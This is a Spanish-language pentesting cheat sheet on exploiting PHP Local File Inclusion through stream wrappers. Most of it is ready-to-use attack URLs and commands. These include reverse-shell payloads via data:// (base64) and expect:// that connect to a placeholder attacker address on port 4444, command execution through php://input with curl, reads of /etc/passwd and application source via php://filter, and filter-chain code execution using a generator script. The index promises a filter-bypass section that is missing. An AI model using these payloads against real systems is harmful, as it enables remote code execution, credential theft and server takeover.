
---
## 🔎 Índice

1. [Metodología Básica](#metodología-básica)  
2. [Wrappers Más Usados](#wrappers-más-usados)  
3. [Ejemplos Prácticos y Reverse Shells](#ejemplos-prácticos-y-reverse-shells)  
4. [Wrappers Avanzados & Chains](#wrappers-avanzados--chains)  
5. [Bypass de Filtros & Tips](#bypass-de-filtros--tips)
6. [Resumen de Wrappers y Utilidad](#resumen-de-wrappers-y-utilidad)  

---

## 1️⃣ [Metodología Básica](#metodología-básica)

> [!info] **¿En qué consiste LFI?**  
> 1. La aplicación hace `include($_GET['file']);` sin validar.  
> 2. Atacante controla `?file=…` apuntando a `/etc/passwd`, logs con código PHP, etc.  
> 3. Con wrappers especiales “enganchamos” streams para leer o ejecutar.  

---

## 2️⃣ Wrappers Más Usados

| Wrapper                                  | Acción / Descripción                                                       |
|------------------------------------------|-----------------------------------------------------------------------------|
| `data://text/plain;base64,…`             | Inyecta PHP embebido en Base64→texto plano→ejecuta                          |
| `expect://<bin>?<cmd>`                   | Llama a un binario del sistema y ejecuta `<cmd>`                            |
| `php://input`                            | Lee el cuerpo de la petición HTTP como si fuese un archivo PHP               |
| `php://filter/read=string.rot13/...`     | Aplica ROT13 al contenido (necesita decodificación en cliente)              |
| `php://filter/convert.base64-encode/...` | Codifica en Base64 el recurso indicado                                        |
| `php://filter/convert.iconv.F.T/...`     | Transcodifica entre codificaciones (UTF‑8→UTF‑7, etc.) para evadir filtros   |
| `zip://<zipfile>#<file>`                 | Lee un archivo dentro de un ZIP                                             |
| `phar://<pharfile>`                      | Carga un PHAR (puede deserializar y ejecutar gadgets)                       |
| `compress.zlib://<file>`                 | Descomprime on‑the‑fly                                                       |
| `php://temp`, `php://memory`             | Crear recursos en memoria y luego incluir                                    |

---

## 3️⃣ Ejemplos Prácticos y Reverse Shells

#### 3.1 `data://text/plain;base64,…`

> [!example]  
> Incluir y ejecutar PHP en Base64  
> ```url
> /vuln.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJicmEgaSA+JiAvZGV2L3RjcC9MQUNBTF9JUDQvNDQ0NCAwPiYxIik7ID8+
> ```  
> → decodifica `<?php system("bash -i >& /dev/tcp/LACAL_IP4/4444 0>&1"); ?>`

#### 3.2 `expect://`

> [!example]  
> Ejecutar `whoami`:  
> ```url
> /vuln.php?file=expect://usr/bin/whoami
> ```

> [!example]  
> Reverse shell:  
> ```url
> /vuln.php?file=expect://usr/bin/bash?bash -i >& /dev/tcp/LACAL_IP4/4444 0>&1
> ```

#### 3.3 `php://input`

> [!example]  
> ```bash
> curl -X POST -d '<?php system("id"); ?>' "http://victim/vuln.php?file=php://input"
> ```

#### 3.4 `php://filter/read=string.rot13/resource=<file>`

> [!example]  
> ```url
> /vuln.php?file=php://filter/read=string.rot13/resource=index.php
> ```  
> → Copia salida y ejecuta:  
> ```bash
> tr 'A-Za-z' 'N-ZA-Mn-za-m' < dump.txt
> ```

#### 3.5 `php://filter/convert.base64-encode/resource=<file>`

> [!example]  
> ```url
> /vuln.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
> ```  
> → Decodifica: `base64 -d`

#### 3.6 `php://filter/convert.iconv.UTF8.UTF7/resource=<file>`

> [!example]  
> ```url
> /vuln.php?file=php://filter/convert.iconv.UTF8.UTF7/resource=index.php
> ```  
> → Interpreta contenido en UTF‑7 para bypass de filtros.

---

## 4️⃣ Wrappers Avanzados & Filter Chains – Explicación Detallada

En entornos donde **`allow_url_include`** está deshabilitado y no puedes subir archivos, las **filter chains** de PHP te permiten inyectar y ejecutar código **sin crear ningún fichero**. Veamos cómo funcionan paso a paso.

---

### 🧩 ¿Qué es un “filter chain”?

1. **Filter**: Un filtro PHP es una rutina que transforma el contenido de un _stream_ (archivo, entrada, etc.).  
2. **Chain**: Enlazas varios filtros uno tras otro, de modo que la salida de uno sea la entrada del siguiente.  
3. **Wrapper**: Usas `php://filter` como _wrapper_ para aplicar la cadena de filtros a un recurso (p. ej. `php://temp`, memoria, o un archivo específico).

---

### ⚙️ Mecanismo interno

1.  **Include inicial**  
   La aplicación hace algo como:
   ```php
   include($_GET['file']);
````

2. **php://filter wrapper**  
    La URL `file=php://filter/<cadena>/resource=php://temp` le indica a PHP que:
    
    - Abra un _stream_ en memoria (`php://temp`).
        
    - Aplique tu `filter chain` leyendo de él.
        
3. **php://temp**
    
    - Es un stream vacío pero **escribible**: PHP lo carga como “archivo” y luego tu código inyectado se escribe ahí.
        
    - Cuando “incluyes” el stream, PHP lo interpreta como si fuera un archivo físico.
        
4. **Inyección de tu PHP**
    
    - La `filter chain` decodifica y transforma tu base64 u otras codificaciones hasta producir el PHP en texto plano.
        
    - Al final, PHP ejecuta ese texto como código.

### 🔧 Uso de [[Php_filter_chain_generator.py]]

Este script genera automáticamente la cadena de filtros necesaria para que tu payload (p. ej. `<?php phpinfo(); ?>`) acabe visible en el _stream_:
```bash
python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  ' 
```

-  Salida (ejemplo): php://filter/   convert.iconv.UTF8.CSISO2022KR|   convert.base64-encode|   convert.iconv.UTF8.UTF7|   convert.iconv.SE2.UTF-16|   … (varios pasos más) …|   convert.base64-decode| /resource=php://temp

- Cada **`convert.iconv.X.Y`** recodifica el stream de la codificación **X** a **Y**.
    
- Los pasos de **`base64-encode`** y **`base64-decode`** introducen/retiran capas de cifrado para esquivar filtros que busquen texto PHP directo.
    
- Al final, **`resource=php://temp`** indica que todo el pipeline lee de un recurso en memoria donde PHP cargará tu código.
    

---

### 🔍 Desglose de un fragmento de cadena

Imagina parte de tu chain así:

|Paso|Función|
|---|---|
|`convert.iconv.UTF8.CSISO2022KR`|Transforma de UTF‑8 → CSISO2022KR (cambia bytes)|
|`convert.base64-encode`|Base64‑encodes los datos actuales|
|`convert.iconv.UTF8.UTF7`|UTF‑8 → UTF‑7 (introduce símbolos ‘+’, ‘/’ que pueden pasar filtros)|
|…|… (varios convert.iconv a diferentes codificaciones)|
|`convert.base64-decode`|Decodifica la capa de Base64, revelando finalmente el payload PHP original|

Al concatenar docenas de estos pasos, el texto original `<?php phpinfo(); ?>` queda **oculto** en múltiples capas de codificación y recodificación, hasta que el último filtro lo deja listo para PHP.


## 6️⃣ Resumen de Wrappers y Utilidad

|Wrapper|Utilidad / Ejemplo|
|---|---|
|`data://text/plain;base64,…`|Embebe PHP codificado y lo ejecuta (RCE)|
|`expect://<bin>?<cmd>`|Llama a binarios del sistema y ejecuta|
|`php://input`|Incluye código enviado en POST|
|`php://filter/read=string.rot13/resource=<file>`|ROT13 + decode manual|
|`php://filter/convert.base64-encode/resource=<file>`|Base64 → decodificar en cliente|
|`php://filter/convert.iconv.FROM.TO/resource=<file>`|Transcodifica para evadir filtros|
|`zip://<zipfile>#<file>`|Leer contenido dentro de ZIP|
|`phar://<pharfile>`|Deserializar/ejecutar gadgets desde PHAR|
|`compress.zlib://<file>`|Descomprimir on‑the‑fly|
|`php://temp`, `php://memory`|Recursos en memoria temporales para filter chains|
